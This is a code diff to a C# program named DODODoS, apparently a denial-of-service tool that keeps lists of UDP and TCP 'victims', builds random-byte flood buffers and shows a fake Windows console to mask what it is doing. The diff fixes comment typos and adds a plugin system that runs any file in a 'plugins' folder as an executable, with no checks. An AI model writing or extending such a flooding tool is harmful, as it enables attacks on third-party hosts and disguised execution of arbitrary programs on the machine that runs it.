@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Text;
+using System.IO;
 using System.Diagnostics;
 using System.Threading;
 using System.Net;
@@ -12,6 +13,7 @@ namespace DODODoS {
         static Dictionary<String, Action> cmd;
         static List<Tuple<string, UDP>> UdpVictims = new List<Tuple<string, UDP>>();
         static List<Tuple<string, TCP>> TcpVictims = new List<Tuple<string, TCP>>();
+        static string pluginPath = "plugins";
         static Process FakeConsole = new Process();
         static string FakeConsoleLog = "";
         static readonly string FakeConsolePointer = @"C:\User\{0}";
@@ -39,7 +41,7 @@ namespace DODODoS {
             }
         }
         /// <summary>
-        /// This method erase the console and let u use the windows commands
+        /// This method erases the console and let u use the windows commands
         /// </summary>
         static void Console_CancelKeyPress(object sender, ConsoleCancelEventArgs e) {
             lock (toLockSyncHiddenNot) {
@@ -58,7 +60,7 @@ namespace DODODoS {
                         }
                     }
                     Console.Write(FakeConsolePointer + ">");
-                    command = Console.ReadLine();    //Write what is new in the log, writes the pointer and whaits for commands
+                    command = Console.ReadLine();    //Write what is new in the log, writes the pointer and waits for commands
                 }
             }
         }
@@ -114,6 +116,12 @@ namespace DODODoS {
             cmd.Add("stop", new Action(Stop));
             cmd.Add("list", new Action(List));
             cmd.Add("clear", new Action(Clear));
+
+            foreach (string plugin in Directory.GetFiles(pluginPath))
+            {
+                cmd.Add(Path.GetFileNameWithoutExtension(plugin), new Action(() => PlgExec(plugin)));
+            }
+
             cmd.Add("help", new Action(Help));
             //cmd.Add("chat", new Action(StartChat));   REMOVED UNTIL IT WORKS
             cmd.Add("exit", new Action(Exit));
@@ -269,6 +277,36 @@ namespace DODODoS {
                 b[i] = Convert.ToByte(new Random().Next(255));
             return b;
         }
+
+        static bool PlgExec(string name)
+        {
+            Process plg = new Process();
+            ProcessStartInfo psi = new ProcessStartInfo()
+            {
+                FileName = name,
+                UseShellExecute = false,
+                RedirectStandardError = true,
+                RedirectStandardInput = true,
+                RedirectStandardOutput = true,
+            };
+            plg.StartInfo = psi;
+            plg.Start();
+            new Thread(() =>
+            {
+                while (!plg.StandardOutput.EndOfStream)
+                {
+                    Console.WriteLine(plg.StandardOutput.ReadLine());
+                }
+            }) { IsBackground = true }.Start();
+
+
+            while (!plg.StandardOutput.EndOfStream)
+            {
+                plg.StandardInput.WriteLine(Console.ReadLine());
+            }
+            return true;
+        }
+
         static void StartChat() {
             Console.Clear();
             consoleInterface.DrawTop("DodoSWAG CHAT 1.00");
